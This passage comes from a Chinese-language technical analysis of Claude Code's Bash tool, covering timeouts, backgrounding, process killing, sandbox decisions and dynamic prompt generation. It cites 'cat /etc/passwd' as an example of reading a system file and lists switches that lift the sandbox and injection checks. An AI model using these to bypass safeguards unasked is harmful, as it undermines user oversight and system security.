    if (env && !isNaN(parseInt(env))) return parseInt(env);
    return 120000;                      // 2 分钟
}

// 最大超时
function fC_() {
    let env = process.env.BASH_MAX_TIMEOUT_MS;
    if (env && !isNaN(parseInt(env)))
        return Math.max(parseInt(env), QkH());
    return Math.max(600000, QkH());     // 10 分钟
}
```

### 超时后的行为：自动后台化

超时并不意味着直接 kill — 如果命令满足自动后台化条件，CC 会将它转移到后台继续执行：

```javascript
// D48 类的超时回调
static #J(processManager) {
    if (processManager.#shouldAutoBackground && processManager.onTimeout) {
        // 条件满足 → 转入后台
        processManager.onTimeout(processManager.background.bind(processManager));
    } else {
        // 条件不满足 → 直接 kill (SIGTERM, code=143)
        processManager.#kill(143);
    }
}
```

自动后台化的条件是：后台任务未被禁用（`!xC_`）且命令不是 `sleep` 类命令。

### 三种后台化方式

| 方式 | 触发条件 | 行为 |
|------|---------|------|
| **显式后台** | `run_in_background: true` | 命令启动后立即返回，输出通过 taskId 查询 |
| **超时自动后台** | 命令超时 + shouldAutoBackground | 超时后转入后台继续执行 |
| **用户手动** | 用户按 Ctrl+B | UI 触发 `background()` 方法 |

### D48 进程管理器

D48 类是 Bash 工具的**进程生命周期管理器**，维护一个清晰的状态机：

```
D48 状态机
    ┌──────────┐
    │ running  │ ← 初始状态
    └────┬─────┘
         │
    ┌────┼──────────────────┐
    │    │                  │
    ▼    ▼                  ▼
┌──────────┐  ┌──────────┐  ┌──────────┐
│backgrounded│  │  killed  │  │completed │
└──────────┘  └──────────┘  └──────────┘
```

关键实现细节：

```javascript
class D48 {
    #status = "running";                // 状态
    #child;                             // ChildProcess
    #timer = null;                      // 超时定时器
    #fileSizeMonitor = null;            // 后台文件大小监控

    // kill — 使用 tree-kill 递归杀死进程树
    #kill(code) {
        this.#status = "killed";
        if (this.#child.pid)
            treekill(this.#child.pid, "SIGKILL");
        // treekill 递归杀死所有子进程
    }

    // 后台化
    background(taskId) {
        if (this.#status !== "running") return false;
        this.#status = "backgrounded";
        this.#cleanupTimers();

        // 启动文件大小监控（每 5 秒检查一次）
        this.#startFileSizeMonitor();
        return true;
    }

    // 文件大小监控 — 防止后台任务输出无限增长
    #startFileSizeMonitor() {
        this.#fileSizeMonitor = setInterval(() => {
            fs.stat(this.taskOutput.path).then(stat => {
                if (stat.size > 5368709120) {  // 5 GB
                    this.#kill(137);            // 输出太大，强制 kill
                }
            });
        }, 5000);                              // 每 5 秒
    }
}
```

> **设计决策**：为什么用 `SIGKILL` 而非 `SIGTERM`？`SIGTERM` 可以被进程捕获和忽略，而 Agent 执行的命令可能来自不受信任的代码。`SIGKILL` 确保进程一定被终止。配合 `tree-kill` 递归杀死整个进程树（而非仅 Shell 进程），确保 `npm install` 等产生大量子进程的命令能被彻底终止。

### 信号处理

```javascript
// abort 信号处理（用户按 Ctrl+C）
#onAbort() {
    if (this.#abortSignal.reason === "interrupt") return; // 中断模式不 kill
    this.kill();
}

// 退出码解释
#onExit(code, signal) {
    let exitCode = code !== null ? code :
                   signal === "SIGTERM" ? 144 : 1;   // 144 = 128 + SIGTERM
    this.#resolve(exitCode);
}
```

**小结**：超时控制通过三层结构（默认 2min / 最大 10min / 绝对 30min）应对不同场景。后台任务系统支持三种触发方式，D48 进程管理器通过清晰的状态机控制进程生命周期。tree-kill + SIGKILL 确保了进程的可靠终止。

---

## 9.7 沙箱集成

沙箱是 Bash 工具的**安全基石** — 它限制了命令对文件系统、网络和系统资源的访问。本节聚焦 Bash 工具侧的沙箱调用逻辑，沙箱的内部实现（Seatbelt/bwrap）将在 Sandbox 专题章节详述。

### 沙箱决策

`vC()` 函数决定一个命令是否在沙箱中执行，遵循 5 步判断：

```javascript
function vC(input) {
    // 1. 沙箱全局开关
    if (!j8.isSandboxingEnabled()) return false;

    // 2. dangerouslyDisableSandbox 参数
    if (input.dangerouslyDisableSandbox && j8.areUnsandboxedCommandsAllowed())
        return false;

    // 3. 空命令不沙箱
    if (!input.command) return false;

    // 4. 排除列表检查
    if (js1(input.command)) return false;

    // 5. 默认 → 启用沙箱
    return true;
}
```

```
vC() 判断流程
    │
    ├── 沙箱未启用？ ─────────────────── → 不沙箱
    ├── dangerouslyDisableSandbox=true？─ → 不沙箱（需要权限允许）
    ├── 空命令？ ─────────────────────── → 不沙箱
    ├── 命中排除列表？ ───────────────── → 不沙箱
    └── 默认 ─────────────────────────── → 沙箱 ✓
```

### 命令排除列表

排除列表 `js1()` 支持三种匹配模式，让用户精确控制哪些命令可以跳过沙箱：

| 模式 | 格式 | 示例 | 匹配 |
|------|------|------|------|
| **精确匹配** | `command` | `"ls"` | 只匹配 `ls` |
| **前缀匹配** | `command *` | `"docker *"` | 匹配 `docker run`、`docker build` 等 |
| **通配符** | `cmd * arg` | `"npm run *"` | 匹配 `npm run test`、`npm run build` 等 |

排除列表的匹配还考虑了命令的**变体** — 去掉引号（`"ls"` → `ls`）和路径前缀（`/usr/bin/ls` → `ls`），提高匹配准确性。

### 沙箱包装

当决定使用沙箱时，命令在 `jLH()` 中被包装：

```javascript
if (shouldUseSandbox) {
    // 1. 包装命令（添加 sandbox-exec / bwrap 前缀）
    command = await j8.wrapWithSandbox(command, tmpDir, undefined, signal);

    // 2. 创建沙箱临时目录（0700 权限，仅命令进程可访问）
    await fs.mkdir(sandboxTmpDir, { mode: 0o700 });
}
```

包装后的命令形如：
```bash
# macOS
sandbox-exec -f /tmp/claude-seatbelt.sb bash -c "eval 'npm install' && pwd -P >| ..."

# Linux
bwrap --ro-bind / / --bind $CWD $CWD --dev /dev ... bash -c "eval 'npm install' && pwd -P >| ..."
```

### Prompt 中的沙箱描述

Bash 工具的 prompt 会根据沙箱状态动态添加描述（`FJ1()` 函数）：

- **允许 unsandboxed**：提示 Agent 默认使用沙箱，遇到沙箱导致的失败时可用 `dangerouslyDisableSandbox: true` 重试
- **强制沙箱**：提示 Agent 所有命令必须在沙箱中运行

这让 LLM 了解当前的安全约束，能做出正确的工具调用决策。

> **设计决策**：沙箱决策在权限检查之后、进程启动之前。这意味着：被用户拒绝的命令不会到达沙箱层（节省包装开销），沙箱包装对执行引擎透明（`_P1()` 不知道命令是否被沙箱化），`dangerouslyDisableSandbox` 是命令级别的（而非全局开关）。

**小结**：沙箱集成通过 5 步判断决定是否启用，通过排除列表和 `dangerouslyDisableSandbox` 提供灵活的豁免机制。沙箱的"后置"设计使其对上层代码透明，同时保持了命令级别的控制粒度。

---

## 9.8 Prompt 动态生成

Bash 工具的 prompt 不是一段静态文本，而是由 `BE7()` 函数**动态生成**的。它根据当前环境配置（沙箱状态、超时参数、可用工具）组装不同的段落，精确引导 LLM 的行为。

### Prompt 的组成

```
BE7() 生成的 Bash Prompt 结构
    │
    ├── 基础描述
    │    "Executes a given bash command and returns its output."
    │    "The working directory persists between commands,
    │     but shell state does not."
    │
    ├── 工具替代建议 ⭐
    │    "File search: Use Glob (NOT find or ls)"
    │    "Content search: Use Grep (NOT grep or rg)"
    │    "Read files: Use Read (NOT cat/head/tail)"
    │    "Edit files: Use Edit (NOT sed/awk)"
    │    "Write files: Use Write (NOT echo >/cat <<EOF)"
    │
    ├── 超时信息
    │    "Default timeout: 120000ms (2 minutes)"
    │    "Max timeout: 600000ms (10 minutes)"
    │
    ├── 沙箱描述 (FJ1())
    │    ├── 允许 unsandboxed → "默认用沙箱，失败可重试"
    │    └── 强制沙箱 → "所有命令必须在沙箱中运行"
    │
    └── Git 操作指南 (pE7())
         "Prefer new commits over amending"
         "Never skip hooks (--no-verify)"
         "Never force push to main/master"
```

### 为什么引导 LLM 不用 Bash 做文件操作？

工具替代建议是 Prompt 中最重要的部分。它告诉 LLM：**虽然你可以用 `cat`/`grep`/`sed` 做文件操作，但请用专用工具。**

原因有三：
1. **安全性** — `cat /etc/passwd` 通过 Bash 需要权限确认，通过 Read 由权限规则自动控制
2. **结构化** — Read 返回 discriminated union（有行号、有 mtime），`cat` 返回纯文本
3. **用户体验** — Edit 的 diff 展示比 `sed` 的静默修改更友好

```javascript
let suggestions = [
    `File search: Use ${GlobToolName} (NOT find or ls)`,
    `Content search: Use ${GrepToolName} (NOT grep or rg)`,
    `Read files: Use ${ReadToolName} (NOT cat/head/tail)`,
    `Edit files: Use ${EditToolName} (NOT sed/awk)`,
    `Write files: Use ${WriteToolName} (NOT echo >/cat <<EOF)`,
    "Communication: Output text directly (NOT echo/printf)"
];
```

> **设计决策**：动态 Prompt 让 Bash 工具能适应不同的运行环境。在沙箱启用时添加沙箱描述，在受限模式（Agent 子进程）中移除搜索工具建议。这比维护多个静态 prompt 模板更灵活，也更不容易出现不同步问题。

**小结**：Bash 的 Prompt 是动态组装的，核心作用有二：引导 LLM 使用专用工具替代 Bash 文件操作，告知 LLM 当前的安全约束（沙箱、超时）。这体现了"通过 Prompt 影响 LLM 行为"的工程实践。

---

## 9.9 设计启示：命令执行的工程智慧

从 Claude Code Bash 工具的实现中，可以提炼出以下可迁移的工程经验：

### 1. 异步生成器 = 流式进度的优雅解法

```javascript
// 生成器侧 yield 进度
yield { type: "progress", output, elapsedTimeSeconds, ... };

// 消费侧迭代
for await (let progress of _P1(args)) {
    updateUI(progress);
}
```

相比回调函数或 EventEmitter，异步生成器有两个优势：天然支持**背压控制**（消费方没准备好时 yield 自动暂停），代码结构更线性可读。如果你的 Agent 需要处理耗时工具调用并实时汇报进度，异步生成器是值得考虑的方案。

### 2. 三层输出缓冲 = 应对不确定输出量的通用模式

```
内存 (< 8MB) → 磁盘 (< 64MB) → 截断返回 (< 150K字符)
```

这个模式适用于任何"输出量不确定"的场景。关键设计点：
- **环形缓冲区**保留最近 N 行，溢出后仍有快速访问能力
- **硬链接**让持久化文件可从多个路径访问
- 截断时给出**文件路径**，完整数据不丢失

### 3. Shell 快照 = 避免冷启动的"预热"机制

每个命令都是独立进程（安全），但通过快照一次性捕获 rc 文件效果后复用（高效）。这个"独立执行 + 共享状态快照"的模式适用于任何需要"安全隔离但环境一致"的场景 — 比如 CI 中的 Docker 层缓存、Lambda 冷启动优化。

### 4. tree-kill = 进程树而非单进程

```javascript
treekill(pid, "SIGKILL");  // 递归杀死整个进程树
```

`npm install`、`make build` 等命令会产生大量子进程。只杀 Shell 进程会留下僵尸子进程。配合 `detached: true`（独立进程组），`tree-kill` 确保信号能正确传播到所有后代进程。

### 5. CWD 文件传递 = 无状态进程间通信

每个命令是独立进程，但用户期望 `cd` 能"持久化"。CC 的方案：
```bash
eval 'cd /some/path && do_stuff' && pwd -P >| /tmp/claude-cwd
```
命令完成后读取文件更新内部 CWD。这比维护持久 Shell 会话更安全、更可预测。

### 6. 双 Schema 设计 = 内部能力 vs 外部接口分离

`_simulatedSedEdit` 对 LLM 不可见，但 CC 内部可以使用它。这种"内部 Schema ⊃ 外部 Schema"的模式让工具可以有隐藏的内部能力通道，同时不污染 LLM 的工具选择空间。

### 7. 默认安全 = ask 而非 allow

权限检查的默认返回是 `{ behavior: "ask" }` — 不确定就问用户。只有在严格满足条件时（沙箱 + 白名单）才自动允许。这个"默认拒绝、显式允许"的模式是所有安全系统的黄金法则。

---

## 速查表

### 关键常量

| 常量 | 值 | 含义 |
|------|-----|------|
| 默认超时 | 120,000 ms (2 分钟) | `QkH()` |
| 最大超时 | 600,000 ms (10 分钟) | `fC_()` |
| 绝对超时上限 | 1,800,000 ms (30 分钟) | `h31` |
| 内存缓冲上限 | 8 MB (`q31`) | TaskOutput 内存限制 |
| 输出截断阈值 | 150,000 字符 (`Dm6`) | 返回给 LLM 的最大输出 |
| 截断最小值 | 30,000 字符 (`jm6`) | 用户可配的下限 |
| 持久化文件上限 | 64 MB | 输出文件截断点 |
| 后台文件上限 | 5 GB (`bi_`) | 超过后 kill 进程 |
| 环形缓冲区 | 1,000 行 | 最近输出保留行数 |
| 快照超时 | 10,000 ms (`mW7`) | Shell 快照创建超时 |
| 文件大小监控间隔 | 5,000 ms (`YYK`) | 后台任务监控频率 |

### 关键环境变量

| 变量 | 效果 |
|------|------|
| `CLAUDE_CODE_SHELL` | 覆盖 Shell 选择 |
| `BASH_DEFAULT_TIMEOUT_MS` | 覆盖默认超时 |
| `BASH_MAX_TIMEOUT_MS` | 覆盖最大超时 |
| `BASH_MAX_OUTPUT_LENGTH` | 覆盖输出截断阈值 |
| `CLAUDE_CODE_DISABLE_BACKGROUND_TASKS` | 禁用后台任务 |
| `CLAUDE_CODE_SUBPROCESS_ENV_SCRUB` | 启用环境变量清理 |
| `CLAUDE_CODE_DISABLE_COMMAND_INJECTION_CHECK` | 禁用注入检测 |
| `CLAUDE_CODE_BASH_SANDBOX_SHOW_INDICATOR` | 沙箱命令显示指示器 |

### 关键函数索引

| 函数 | 作用 |
|------|------|
| `y7` (对象) | Bash 工具完整定义 |
| `BE7()` | Prompt 动态生成 |
| `FJ1()` | 沙箱 Prompt 段生成 |
| `UE7()` | 外部 Input Schema (Zod) |
| `FE7()` | 内部 Input Schema (含 _simulatedSedEdit) |
| `gc6()` | 权限检查主函数 |
| `_P1()` | 命令执行引擎 (async generator) |
| `jLH()` | 子进程启动核心 |
| `y31()` | Shell 检测与选择 |
| `sW7()` | Bash Shell Provider |
| `k31()` | 禁用扩展 glob |
| `BW7()` | Shell 快照创建 |
| `Lx()` | 环境变量继承与清理 |
| `D31` (数组) | 被清理的敏感变量列表 |
| `QT` (类) | TaskOutput 输出管理 |
| `D48` (类) | 进程生命周期管理 |
| `Sy_()` | 创建 D48 实例 |
| `vC()` | 沙箱启用决策 |
| `js1()` | 命令排除列表匹配 |
| `QkH()` | 默认超时 (2 分钟) |
| `fC_()` | 最大超时 (10 分钟) |
| `ALH()` | 输出大小限制 |
| `nE_()` | 输出清理（去空行） |
| `boH()` | 图片数据检测 |
| `mnH()` | 安全提示提取 |
| `MR7()` | 退出码解释 |
